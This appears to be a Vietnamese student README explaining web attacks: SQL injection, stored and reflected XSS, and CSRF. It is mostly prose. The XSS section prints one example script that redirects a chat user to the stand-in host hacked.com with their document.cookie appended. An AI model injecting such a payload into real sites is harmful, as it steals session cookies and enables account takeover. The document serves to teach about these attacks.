# Demo Tấn Công & Phòng Thủ Bảo Mật Thông Tin
## :heart:Phương pháp tấn công :heart:
### SQL Injection
Link Video :link: https://www.youtube.com/watch?v=QIh769LrcZ0 <br>
### XSS (Cross-Site-Scripting)
**Thường có 2 loại XSS:** Storage XSS & Reflected XSS (ngoài ra có DOM-BASE XSS tham khảo thêm trên Hacksplaning.com) <br>
Loại Storage XSS thì nguy hiểm hơn vì người dùng nếu truy cập vào trang đã bị hack thì sẽ bị hack ngay. Còn Reflected XSS thì khi người dùng click vào mới bị hack.<br>
**XSS** là dạng tấn công bằng cách chèn(inject) đoạn code Javascript vào trang web. Các trang web thường có những form hay textbox để nhập thông tin, thay vì nhập thông tin hay chat
bình thường thì hacker viết đoạn script vào đó (đoạn script có thể đính kèm cookie). Từ đó người dùng vào trang web có thể bị dẫn đến 1 trang web khác, hoặc tự động down file gì
đó về máy chưa virus, hoặc alert ra thông báo gì đó..v..v <br>
Vd: Khi 2 người chat với nhau qua app nào đó. Hacker nhập 1 đoạn script vào ô chat:<br> <script>window.location = 'hacked.com?cookie='+document.cookie</script> <br>
Đoạn script này được lưu vào database **(Storage XSS)** rồi hiển thị lên, bên kia người dùng bị đẫn đến trang hacked.com và kèm theo cookie của họ. Bên đây hacker đã lấy đc cookie của bạn được gửi lên server hacker, từ đó hacker có thể đăng nhập vào tài khoản của bạn.<br>
**Reflected XSS:** hay tấn công bằng URL, một số trang HTML có 1 số thông tin hiển thị gì thì trên Url cái đuôi(URI) nó hiển thị theo cái đó. Hacker dựa vào đây tạo 1 đường link
lôi cuốn người dùng click vào, đường link này direct sang trang HTML khác, trang đó có chứa đoạn script lấy đi cookie của người dùng.
### CSRF (Cross-Site-Request-Forgery)
Là một dáng tấn công bằng cách dùng trang web của hacker tạo ra, giả danh một request tới trang web muốn hack(có cookie), trang web đó sẽ tưởng là request của người dùng của mình và trả lại thông tin dựa theo nội dung của người dùng request.<br>
Vd: Hacker tạo ra một trang web dụ dỗ bạn click vào gì đó, bản chất bên dưới nó là 1 cái form, form này có action="link tới trang web muốn hack" method="POST" content là nội dung bạn muốn hiển thị lên trang muốn hack,
 nội dung này đính kèm thêm cái link tiếp tục lại quá trình click vào link và post thêm 1 link mới lên trang muốn hack (Spreading Sworm)
